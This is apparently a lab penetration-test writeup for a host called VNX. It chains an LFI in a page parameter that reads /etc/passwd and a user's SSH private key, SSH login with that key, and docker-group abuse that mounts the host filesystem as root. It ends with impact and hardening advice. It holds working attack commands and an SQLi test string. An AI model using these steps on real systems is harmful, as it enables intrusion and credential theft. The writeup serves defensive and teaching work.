@@ -1,1 +1,146 @@
+ VNX — Penetration Test Writeup
+--------------------------------
+Difficulty: Medium | **Type:** Linux, Black-box | **Category:** Web (LFI) → SSH → Privilege Escalation (Docker)
 
+Summary
+---------
+VNX is a black-box internal lab target compromised end-to-end without any prior credentials. An unauthenticated local File Inclusion (LFI) vulnerability in a web application parameter was used to read an SSH private key from a low-privileged user's home directory. That key granted shell access, and membership in the `docker` group was then abused to mount the host filesystem inside a privileged container — achieving full root-equivalent compromise.
+
+Attack chain: LFI → SSH key disclosure → shell access → docker group abuse → root
+
+ Environment
+--------------
+| Target IP | 192.168.1.8| 
+| Attacker IP | 192.168.1.7 |
+| Attacker OS | Kali Linux |
+| Target OS | Ubuntu 20.04.6 LTS |
+| Test type | Black-box, unauthenticated, internal network |
+------------------------------------------------------------
+ Tools Used
+------------
+
+- nmap — host discovery, port/service enumeration
+- gobuster — directory brute-forcing
+- curl — LFI exploitation / file retrieval
+- ssh / scp — remote access and file transfer
+- docker — privilege escalation
+
+ Recon & Enumeration
+---------------------
+
+Host discovery:
+   bash
+nmap 192.168.1.7/24 -sn -sCV
+
+
+Port/service scan:
+   bash
+nmap 192.168.1.8 -sCV -Pn
+
+Open ports: `22/tcp` (OpenSSH 8.2p1), `80/tcp` (Apache 2.4.41, Ubuntu)
+
+Web content discovery:
+  bash
+gobuster dir -url http://192.168.1.8/ -w /usr/share/seclists/Discovery/Web-Content/big.txt
+
+Discovered hidden directory `/ctf`, which hinted at a page GET parameter.
+
+ Vulnerabilities
+
+   1. SQL Injection — Tested, Not Exploitable
+
+'OR'1'='1';--
+
+No error-based or behavioral indicators of SQLi. Ruled out.
+
+ 2. Local File Inclusion (LFI) — Confirmed, Critical
+The `page` parameter passed unsanitized user input into a file-read/include function:
+```
+http://192.168.1.8/ctf/?page=/etc/passwd
+```
+Confirmed two accounts of interest: `root` and `vnx` (home: `/home/vnx`).
+
+ Exploitation
+--------------
+
+ 1. Retrieve SSH private key via LFI:
+  bash
+curl "http://192.168.1.8/ctf/?page=/home/vnx/.ssh/id_rsa" > id_rsa
+chmod 600 id_rsa
+
+
+2. Shell access:
+  bash
+ssh vnx@192.168.1.8 -i id_rsa
+
+
+  Privilege Escalation
+-----------------------
+
+Sudo check (dead end):
+  ash
+sudo -l   # vnx has no sudo rights
+
+
+Group enumeration:
+  bash
+id   # uid=1001(vnx) gid=1001(vnx) groups=1001(vnx),136(docker)
+
+`vnx` is a member of the `docker` group — functionally equivalent to root.
+
+Docker group abuse — mount host filesystem into a privileged container:
+  bash
+ On attacker: prep Alpine image
+docker pull alpine
+docker save alpine -o alpine.tar
+scp -i id_rsa alpine.tar vnx@192.168.1.8:/home/vnx
+
+# On target: load and run
+docker load -i alpine.tar
+docker run --rm -it --dns 1.1.1.1 -v /:/mnt alpine
+whoami   # root
+
+With `/` mounted at `/mnt` inside a root-run container, full read/write access to the host filesystem is achieved — enabling an SUID shell, `/etc/passwd` edit, or root `authorized_keys` injection.
+
+Impact
+-------
+
+- Full read/write access to the host filesystem
+- Ability to plant persistent backdoors (root user, SSH key, cron job)
+- Potential pivot point into the internal network
+- Complete loss of confidentiality, integrity, and availability
+
+   Recommendations
+   ----------------
+ 
+   LFI
+- Never pass user input directly into file-include/read functions
+- Use a strict allow-list of permitted filenames
+- Strip/reject path traversal sequences (`../`)
+- Run the web app with least-privilege filesystem access
+
+SSH Key Exposure
+-----------------
+- Never store private keys where a compromised low-privilege process can read them
+- Restrict key permissions to owner only (`chmod 600`)
+- Prefer passphrase-protected keys or short-lived certificates
+
+Docker Group Membership
+-----------------------
+- Never add regular users to the `docker` group unless strictly required
+- Use rootless Docker or user namespace remapping where container access is needed
+- Audit group memberships regularly
+
+General Hardening
+------------------
+- Remove/disable unauthenticated hidden endpoints
+- Deploy a WAF to catch LFI/path-traversal payloads
+- Regular vulnerability assessments and code review of input handling
+- Centralized logging/alerting for file access and container creation events
+
+Conclusion
+
+Full compromise of VNX resulted from chaining three individually low/medium-severity weaknesses — unauthenticated LFI, an exposed SSH key, and unrestricted Docker group membership — into a Critical-severity, unauthenticated root compromise. No single fix would have stopped the chain; remediation must be applied in depth, with the LFI fix and Docker group correction as immediate priorities.
+
+---
+Educational lab writeup — internal network, authorized test only.
